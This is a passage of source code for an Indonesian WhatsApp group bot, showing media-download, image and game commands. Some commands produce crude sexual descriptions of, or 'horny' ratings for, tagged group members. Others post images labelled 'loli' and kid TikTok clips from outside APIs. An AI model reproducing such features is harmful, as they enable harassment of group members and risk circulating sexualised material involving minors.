    const json = await res.json();
    
    if (!json.status || !json.result?.length) {
      return reply('gaada lagu lu yg mau lu cari 😌');
    }

    const track = json.result[0];
    const { title, artist, album, url, cover } = track;

    // Download dengan apiaccess.web.id
    const dlUrl = `https://www.apiaccess.web.id/download/spotify?apikey=ryuu&url=${encodeURIComponent(url)}`;
    const dlRes = await fetch(dlUrl);
    if (!dlRes.ok) throw new Error(`Gagal fetch downloader API: ${dlRes.status}`);
    const dlJson = await dlRes.json();

    if (!dlJson.status || !dlJson.result?.url) {
      return reply('gagal mendapatkan audio dari lagu inii 😅');
    }

    const downloadUrl = dlJson.result.url;
    const titleFinal = dlJson.result.title || title;
    const durationMs = 180000; // jika mau nanti bisa cari dari API atau tetap default

    const buffer = await new Spotify()
      .setAuthor(artist)
      .setAlbum(album || 'Spotify Music')
      .setTitle(titleFinal)
      .setImage(cover)
      .setTimestamp(1000, durationMs)
      .setBlur(1)
      .setOverlayOpacity(0.8)
      .build();

    await RyuuBotz.sendMessage(m.chat, {
      image: buffer,
      caption: `🎶 *Spotify Play* 🎶
🎧 *${titleFinal}* oleh *${artist}*
💿 Album: ${album}
🔗 Spotify: ${url}
_Audio akan segera dikirim..._`,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: titleFinal,
          body: artist,
          thumbnailUrl: cover,
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
RyuuBotz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
    await RyuuBotz.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: "audio/mpeg",
      ptt: true,
      fileName: `${titleFinal}.mp3`,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: titleFinal,
          body: artist,
          thumbnailUrl: cover,
          mediaUrl: url,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (err) {
    console.error('Error di spotplay:', err);
    reply(`❌ Terjadi error bang:\n${err.message || err}`);
  }
}
break
case 'welcome-tes': {
  if (!m.isGroup) return reply('Perintah ini hanya bisa digunakan di dalam grup.');
  if (!isRyuuTheCreator) return reply('Hanya Ryuu sang pencipta yang boleh menggunakan perintah ini~ 🥺');

  const axios = require('axios');
      const { WelcomeLeave } = require('canvafy');

  let ppuser = 'https://files.catbox.moe/m2xkzf.jpg';
  try { ppuser = await RyuuBotz.profilePictureUrl(m.sender, 'image'); } catch {}

  // Ganti background dengan catbox kamu
  const bgURL = 'https://files.catbox.moe/m2xkzf.jpg';
  const groupName = await RyuuBotz.getName(m.chat);

  try {
    const avatarBuffer = (await axios.get(ppuser, { responseType: 'arraybuffer' })).data;
    const bgBuffer = (await axios.get(bgURL, { responseType: 'arraybuffer' })).data;

    const welcomeCard = new WelcomeLeave()
      .setAvatar(avatarBuffer)
      .setBackground("image", bgBuffer)
      .setTitle("Welcome!!")
      .setDescription(`Selamat datang di grup ${groupName}`)
      .setOverlayOpacity(0.5);

    const buffer = await welcomeCard.build();

    await RyuuBotz.sendMessage(m.chat, {
      text: "Yokosooo!",
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: 'Welcome!!',
          body: `Selamat datang`,
          thumbnail: buffer,
          sourceUrl: global.saluran,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })

  } catch (err) {
    console.error('❌ Error membuat kartu welcome:', err);
    reply('Gagal membuat kartu sambutan. Coba lagi nanti.');
  }
}
break;
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replyReinzID(textquotes)
break
case 'handsomecheck':
				if (!text) return replyReinzID(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
RyuuBotz.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replyReinzID(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
RyuuBotz.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replyReinzID(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					RyuuBotz.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
RyuuBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
RyuuBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
RyuuBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replyReinzID(`Contoh ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replyReinzID(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replyReinzID('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replyReinzID(teks)
	    }
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replyReinzID(`Contoh : ${prefix+command} RyuuBotz`) 
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
RyuuBotz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'tiktokgirl':
  if (!isPrem) return replyprem(mess.premium)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'tembak': {
  if (!m.isGroup) return reply('Fitur ini hanya bisa digunakan di grup.')
  if (!m.mentionedJid[0]) return reply(`Siapa yang mau kamu tembak?\nContoh: ${prefix + command} @user`)

  let target = m.mentionedJid[0]
  if (target === m.sender) return reply('Kamu tidak bisa menembak diri sendiri.')
  if (pasangan[m.sender]) return reply('Kamu sudah punya pacar.')
  if (pasangan[target]) return reply('Dia sudah punya pacar.')

  pasangan[m.sender] = { pacar: target, sejak: Date.now() }
  pasangan[target] = { pacar: m.sender, sejak: Date.now() }

  reply(`💌 ${m.pushName} baru saja menembak ${await RyuuBotz.getName(target)} dan mereka sekarang resmi pacaran! 🌹`)
}
break
case 'pacaran': {
  const user = pasangan[m.sender]
  if (!user) return reply('Kamu belum punya pacar.')

  const namaPacar = await RyuuBotz.getName(user.pacar)
  const waktu = global.timeduration(Date.now() - user.sejak)
  reply(`💘 Kamu sedang pacaran dengan *${namaPacar}*\n⏳ Sejak: *${waktu}* yang lalu`)
}
break
case 'putus': {
  const user = pasangan[m.sender]
  if (!user) return reply('Kamu tidak punya pacar.')

  const mantan = user.pacar
  delete pasangan[m.sender]
  delete pasangan[mantan]

  reply(`💔 Kamu telah putus dari ${await RyuuBotz.getName(mantan)}... Semoga baik-baik saja ya.`)
}
break
case 'cekpacar': {
  if (!m.mentionedJid[0]) return reply(`Tag seseorang untuk dicek pacarnya!\nContoh: ${prefix + command} @user`)
  let target = m.mentionedJid[0]

  const data = pasangan[target]
  if (!data) return reply(`${await RyuuBotz.getName(target)} belum punya pacar.`)

  let namaPasangan = await RyuuBotz.getName(data.pacar)
  const waktu = global.timeduration(Date.now() - data.sejak)
  reply(`❤️ ${await RyuuBotz.getName(target)} sedang pacaran dengan *${namaPasangan}*\n⏳ Sejak: *${waktu}* yang lalu`)
}
break
case 'profilepic':  case 'profilepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replyReinzID("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
            case'cekkontol': 
 if (!text) return reply('Nama nya mana yang mau di cek kontol nya')
function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
}

	
 reply(`
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
┃• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','nyentuh bulan','150meter','5km','gak normal'])}
╰═┅═━––––––๑`)
break
case 'afk': {
    if (!m.isGroup) return reply(mess.only.group)
    let reason = args.length ? args.join(" ") : "No reason"
    let user = global.db.users[m.sender]
    user.afkTime = +new Date
    user.afkReason = reason

    replyafk(`${m.pushName} telah melakukan AFK\nAlasan: ${reason}`)
}
break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replyReinzID('What wallpaper do you want?')
reply(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await RyuuBotz.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})
break
case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      RyuuBotz.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'c-loli':
            case 'cosplay-loli':
    await RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    try {
        const res = await fetch('https://raw.githubusercontent.com/kurozann/Img-nest/refs/heads/master/misc/cosplay.json');
        if (!res.ok) throw '❌ Gagal mengambil data!';
        const json = await res.json();

        if (!Array.isArray(json) || json.length === 0) throw '❌ Data kosong!';

        // Pilih gambar acak
        const img = json[Math.floor(Math.random() * json.length)];

        // Kirim gambar
        await RyuuBotz.sendFile(m.chat, img, 'cosplay.jpg', '✨ Nih cosplay loli untuk kamu~', m);
    } catch (e) {
        console.error(e);
        reply(typeof e === 'string' ? e : `❌ Terjadi kesalahan saat memproses permintaan. ${e.message}`);
    }
    break;
case 'loli': {
await RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
  try {
    const baseUrl = 'https://api.nekorinn.my.id/random/loli';
    const response = await fetch(baseUrl);
    const arrayBuffer = await response.arrayBuffer(); // pastikan dalam bentuk arrayBuffer
    const imageBuffer = Buffer.from(arrayBuffer); // konversi ke Buffer
    await RyuuBotz.sendMessage(m.chat, {
      image: imageBuffer,
      caption: `Random ${command} for you!✨`
